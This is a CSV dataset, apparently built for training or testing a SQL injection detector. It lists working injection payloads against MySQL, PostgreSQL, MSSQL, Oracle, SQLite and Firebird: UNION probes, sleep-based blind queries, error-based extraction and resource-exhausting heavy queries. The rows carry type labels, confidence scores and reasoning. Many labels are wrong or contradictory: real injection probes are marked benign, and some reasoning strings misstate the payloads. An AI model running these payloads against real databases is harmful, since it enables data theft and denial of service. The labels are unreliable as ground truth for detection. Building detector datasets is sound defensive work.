id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21558,"1%' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( '%' = '",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21559,"1"" ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( ""hbgr"" like ""hbgr",heavy_query,mysql,0.85,Complex GROUP BY + multiple UNION branches create Cartesian explosion,1
21560,"1"" ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""ajuh"" = ""ajuh",heavy_query,mssql,0.85,Multiple sysusers joins + count() is MSSQL Cartesian DoS attack,2
21561,"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21562,-3535%' ) ) ) or 5605 = 4660 and ( ( ( '%' = ',boolean_blind,generic,0.65,AND/OR equality; payload controls boolean branch execution path,2
21563,"1 ) where 5378 = 5378 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",heavy_query,mysql,0.85,IF() subquery with large constants creates conditional Cartesian payload,2
21564,1'+ ( select 'zgtu' where 8419 = 8419,benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21565,1 ) ) ) and 8990 = 4775 and ( ( ( 1894 = 1894,boolean_blind,generic,0.65,AND equality comparison; payload controls boolean branch execution,2
21566,end and ( '%' = ',benign,generic,0.60,no SQLi signal in heuristic check; standard SQL structure,0
21567,"1"" where 5406 = 5406 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.95,extractvalue() is MySQL XPath error; malformed path triggers data leak,2
21568,"-3865"" ) where 3559 = 3559 union all select 3559,3559,3559,3559,3559,3559,3559--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21569,1%' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( '%' = ',time_blind,postgresql,0.95,pg_sleep() is PostgreSQL time-based; select from pg_sleep triggers delay,3
21570,"1%' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( '%' = '",heavy_query,firebird,0.85,rdb$fields table joins + count() is Firebird Cartesian DoS,2
21571,1' ) ) as pdcl where 6964 = 6964,benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21572,"-9504%"" ) ) or 8098 = 7472",boolean_blind,generic,0.65,AND/OR equality; payload controls boolean branch execution path,2
21573,"-1956"" ) where 1448 = 1448 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",boolean_blind,postgresql,0.70,CAST to numeric type with CASE WHEN branches in PostgreSQL,2
21574,1%' ) and 4595 = 4595#,boolean_blind,generic,0.65,AND equality; payload controls boolean branch execution path,2
21575,1 ) where 9649 = 9649 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.95,pg_sleep() is PostgreSQL time-based; select from pg_sleep triggers delay,3
21576,"1 and make_set ( 8403 = 8403,8899 ) -- rbxf",benign,mysql,0.65,MAKE_SET() function is valid MySQL; not a direct SQLi signal,2
21577,"1"" and make_set ( 4214 = 9503,9503 ) and ""phjg"" like ""phjg",benign,mysql,0.65,MAKE_SET() function is valid MySQL; not a direct SQLi signal,2
21578,1%' ) union all select null--,union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21579,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",heavy_query,mssql,0.85,Multiple sysusers joins + count() is MSSQL Cartesian DoS attack,2
21580,"-6527' ) ) union all select 5053,5053,5053,5053--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21581,1' where 8864 = 8864,benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21582,"1 ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 5132 = 5132",heavy_query,mssql,0.85,Multiple sysusers joins + count() is MSSQL Cartesian DoS attack,2
21583,1' ) ) union all select null--,union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21584,select case when 2095 = 9074 then 1 else null end--,boolean_blind,generic,0.70,CASE WHEN condition; branches execute different SQL paths based on comparison,2
21585,1'|| ( select 'qstz' where 6835 = 6835,boolean_blind,oracle,0.65,WHERE equality clause alone is not injection; standard SQL structure,2
21586,-4961' ) or 3038 = 3038,boolean_blind,generic,0.65,AND/OR equality; payload controls boolean branch execution path,2
21587,"-8824%' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( '%' = '",benign,mysql,0.65,MAKE_SET() function is valid MySQL; not a direct SQLi signal,1
21588,"1' ) where 6214 = 6214 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,0.95,extractvalue() is MySQL XPath error; malformed path triggers data leak,3
21589,"1"" ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""uzjn"" = ""uzjn",error_based,mysql,0.85,EXP() function overflow is MySQL error-based; negation causes arithmetic error,2
21590,"1'|| ( select 'osux' from dual where 7066 = 7066 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",heavy_query,generic,0.70,Multiple system table joins + count() creates Cartesian explosion,1
21591,"1%' ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.85,Multiple sysusers joins + count() is MSSQL Cartesian DoS attack,2
21592,"1"" union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21593,"1%"" ) and sleep ( 5 ) and ( ""%"" = """,time_blind,mysql,0.95,sleep() is MySQL time-based blind; condition triggers sleep in query branch,3
21594,"-5911 union all select 2245,2245,2245,2245,2245,2245#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21595,"1'|| ( select 'scba' where 9079 = 9079 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.85,generate_series(1, 5000000) is PostgreSQL DoS; Cartesian expansion,2
21596,-8099%' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( '%' = ',out_of_band,oracle,0.75,dbms_utility function call is Oracle; can be side-channel via error,1
21597,"-3733' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'ybgd' = 'ybgd",error_based,oracle,0.95,ctxsys.drithsx.sn() Oracle error function; triggers indexing error with data,3
21598,"1"" ) where 5197 = 5197 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.85,elt(condition, sleep()) branches MySQL time delay in true condition path,2
21599,1' in boolean mode ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) #,boolean_blind,mysql,0.80,RLIKE regex pattern matching; true/false branch based on regex match,2
21600,"1"" and sleep ( 5 ) and ""masm"" = ""masm",time_blind,mysql,0.95,sleep() is MySQL time-based blind; condition triggers sleep in query branch,3
21601,1' ) as hcpp where 1863 = 1863,benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21602,"-4828'+ ( select qxnw where 9488 = 9488 union all select 9488,9488--",union_based,oracle,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,2
21603,"1"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""hcjz"" like ""hcjz",heavy_query,mssql,0.85,Multiple sysusers joins + count() is MSSQL Cartesian DoS attack,2
21604,"1' in boolean mode ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.85,randomblob(500000000) creates DoS via large blob generation in SQLite,2
21605,"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21606,"-3710 ) ) union all select 5770,5770,5770,5770,5770,5770,5770#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21607,1' ) where 7537 = 7537 and 2006 = 2006,boolean_blind,generic,0.65,AND equality; payload controls boolean branch execution path,2
21608,"-1272' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",heavy_query,mysql,0.85,GROUP BY + aggregate with FLOOR creates MySQL Cartesian explosion,1
21609,"1"" ) where 8407 = 8407 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.85,rdb$fields table joins + count() is Firebird Cartesian DoS,2
21610,"1"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( ""felm"" = ""felm",time_blind,mysql,0.85,elt(condition, sleep()) branches MySQL time delay in true condition path,2
21611,"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21612,( select * from ( select ( sleep ( 5 ) ) ) srmq ) # gkkx,time_blind,mysql,0.95,sleep() is MySQL time-based blind; condition triggers sleep in query branch,3
21613,"1' ) ) as jvwq where 6596 = 6596 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.85,randomblob(500000000) creates DoS via large blob generation in SQLite,2
21614,"-7916' ) ) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21615,1%' and 9198 = 9198--,boolean_blind,generic,0.65,AND equality; payload controls boolean branch execution path,2
21616,"1'|| ( select 'fdkl' where 4572 = 4572 union all select null,null,null,null,null,null,null,null,null#",union_based,oracle,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,2
21617,"1"" ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( ""awyk"" like ""awyk",benign,mysql,0.65,ELT() with literal values is valid MySQL; not attack signal,1
21618,1%' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( '%' = ',error_based,oracle,0.95,xmltype() cast error is Oracle error-based; invalid XML triggers error,2
21619,"1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""xhvo"" = ""xhvo",heavy_query,oracle,0.85,Multiple all_users joins + count() is Oracle Cartesian DoS,2
21620,"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21621,"1"" ) ) as ubrg where 7318 = 7318 and 7331 = 6529--",boolean_blind,generic,0.65,AND equality; payload controls boolean branch execution path,2
21622,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""ekbq"" = ""ekbq",heavy_query,generic,0.70,Multiple system table joins + count() creates Cartesian explosion,1
21623,"1 ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 5874 = 5874",time_blind,mysql,0.85,elt(condition, sleep()) branches MySQL time delay in true condition path,2
21624,"1"" where 7828 = 7828",benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21625,1'|| ( select 'lljg' from dual where 7631 = 7631,boolean_blind,oracle,0.65,WHERE equality clause alone is not injection; standard SQL structure,2
21626,"-7551 or elt ( 6900 = 7195,7195 )",benign,mysql,0.65,ELT() with literal values is valid MySQL; not attack signal,1
21627,"select * from generate_series ( 1134,1134,case when ( 1134 = 4909 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.70,CASE WHEN with generate_series; branches execute different SQL paths,2
21628,1 ) as iknl where 3885 = 3885 rlike sleep ( 5 ) #,time_blind,mysql,0.90,sleep() is MySQL time-based blind; rlike context triggers delay,2
21629,"1' ) ) as oocd where 2919 = 2919 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.85,randomblob(500000000) creates DoS via large blob generation in SQLite,2
21630,"select * from generate_series ( 3086,3086,case when ( 3086 = 3327 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.70,CASE WHEN with generate_series; branches execute different SQL paths,2
21631,if ( 3245 = 6168 ) select 3245 else drop function nafj--,benign,generic,0.65,IF...THEN...ELSE with DROP is syntax without true injection intent,1
21632,"1%"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.80,RLIKE regex pattern matching; true/false branch based on regex match,2
21633,1'+ ( select xzse where 4530 = 4530,benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21634,1 ) where 7165 = 7165 and sleep ( 5 ) #,time_blind,mysql,0.95,sleep() is MySQL time-based blind; condition triggers sleep in query branch,3
21635,1' ) where 3588 = 3588,benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21636,"1' where 2391 = 2391 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21637,"1"" ) as lgxc where 1117 = 1117 union all select null,null,null,null,null,null,null#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21638,1%' ) and sleep ( 5 ) #,time_blind,mysql,0.95,sleep() is MySQL time-based blind; condition triggers sleep in query branch,3
21639,"1%' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( '%' = '",error_based,mysql,0.95,extractvalue() is MySQL XPath error; malformed path triggers data leak,2
21640,"1' union all select null,null,null,null,null#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21641,"1, ( select ( case when ( 1570 = 1570 ) then ( select 1570 from pg_sleep ( 5 ) ) else 1/ ( select 0 ) end ) )",time_blind,postgresql,0.95,pg_sleep() is PostgreSQL time-based; select from pg_sleep triggers delay,3
21642,"1'|| ( select 'lstx' from dual where 2972 = 2972 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) ||'",heavy_query,mssql,0.85,Multiple sysusers joins + count() is MSSQL Cartesian DoS attack,2
21643,1 where 2649 = 2649 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,mysql,0.95,sleep() is MySQL time-based blind; condition triggers sleep in query branch,3
21644,"1%"" ) ) union all select null#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21645,"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'aiuy' = 'aiuy",time_blind,mysql,0.85,elt(condition, sleep()) branches MySQL time delay in true condition path,2
21646,-4557%' ) ) or 4537 = 3401 and ( ( '%' = ',boolean_blind,generic,0.65,AND/OR equality; payload controls boolean branch execution path,2
21647,1'+ ( select idnb where 2338 = 2338,benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21648,"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'aduc' = 'aduc",heavy_query,mysql,0.85,Complex GROUP BY + multiple UNION branches create Cartesian explosion,1
21649,"1%"" ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""%"" = """,error_based,oracle,0.95,ctxsys.drithsx.sn() Oracle error function; triggers indexing error with data,2
21650,"1%' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( '%' = '",time_blind,mysql,0.85,elt(condition, sleep()) branches MySQL time delay in true condition path,2
21651,"1"" ) ) as uxnc where 8041 = 8041 and 9198 = 9198--",boolean_blind,generic,0.65,AND equality; payload controls boolean branch execution path,2
21652,1' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 'ywbs' = 'ywbs,boolean_blind,mysql,0.80,RLIKE regex pattern matching; true/false branch based on regex match,2
21653,-7442 ) or 3391 = 7492,boolean_blind,generic,0.65,AND/OR equality; payload controls boolean branch execution path,2
21654,"1%' ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21655,1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ),time_blind,postgresql,0.95,pg_sleep() is PostgreSQL time-based; select from pg_sleep triggers delay,3
21656,-1257' ) order by 1#,benign,generic,0.75,ORDER BY clause alone is not injection; valid SQL query structure,2
21657,1' ) where 9317 = 9317 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.95,pg_sleep() is PostgreSQL time-based; select from pg_sleep triggers delay,3
21658,"-4739' ) ) union all select 6585,6585,6585,6585,6585--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21659,"1' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'uorw' like 'uorw",heavy_query,postgresql,0.85,generate_series(1, 5000000) is PostgreSQL DoS; Cartesian expansion,2
21660,"-3472' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",boolean_blind,generic,0.65,CASE WHEN branches execute different SQL paths based on condition,1
21661,"1' ) ) as wves where 2641 = 2641 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.90,benchmark() is MySQL CPU-based time delay; MD5 hashing creates latency,2
21662,"1"" ) as yphz where 8174 = 8174 union all select null,null,null,null,null,null,null--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21663,"1%"" ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.95,pg_sleep() is PostgreSQL time-based; select from pg_sleep triggers delay,3
21664,"1'|| ( select 'ukfj' where 7133 = 7133 union all select null,null,null#",union_based,oracle,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,2
21665,"-6546"" ) order by 1#",benign,generic,0.75,ORDER BY clause alone is not injection; valid SQL query structure,2
21666,"1%' or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.85,Multiple sysusers joins + count() is MSSQL Cartesian DoS attack,2
21667,"-9032 ) ) union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21668,-6792 ) ) as zlho where 4758 = 4758 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,boolean_blind,generic,0.65,CASE WHEN branches execute different SQL paths based on condition,1
21669,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21670,"1', ( select ( case when ( 5249 = 9648 ) then 1 else 1/ ( select 0 ) end ) )",boolean_blind,oracle,0.70,CASE WHEN condition; branches execute different SQL paths based on comparison,2
21671,"1"" ) as qwyt where 4236 = 4236 union all select null,null,null,null,null--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21672,select ( case when ( 2783 = 9216 ) then 1 else 2783* ( select 2783 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.70,CASE WHEN condition; branches execute different SQL paths based on comparison,2
21673,"-2643%"" union all select 7779,7779--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21674,"1%"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""%"" = """,time_blind,oracle,0.95,dbms_pipe.receive_message() is Oracle time-based; pauses execution for N seconds,3
21675,"-1526' ) ) or elt ( 1032 = 1032,3623 ) and ( ( 'xpob' = 'xpob",benign,mysql,0.65,ELT() with literal values is valid MySQL; not attack signal,1
21676,1 where 1931 = 1931 and sleep ( 5 ) --,time_blind,mysql,0.95,sleep() is MySQL time-based blind; condition triggers sleep in query branch,3
21677,1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),time_blind,mysql,0.95,sleep() is MySQL time-based blind; condition triggers sleep in query branch,3
21678,"-4515"" ) or elt ( 4545 = 2509,2509 ) and ( ""lglx"" = ""lglx",benign,mysql,0.65,ELT() with literal values is valid MySQL; not attack signal,1
21679,"1%"" ) ) ) and make_set ( 8191 = 7813,7813 ) and ( ( ( ""%"" = """,benign,mysql,0.65,MAKE_SET() function is valid MySQL; not a direct SQLi signal,2
21680,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21681,"1"" ) where 5491 = 5491",benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
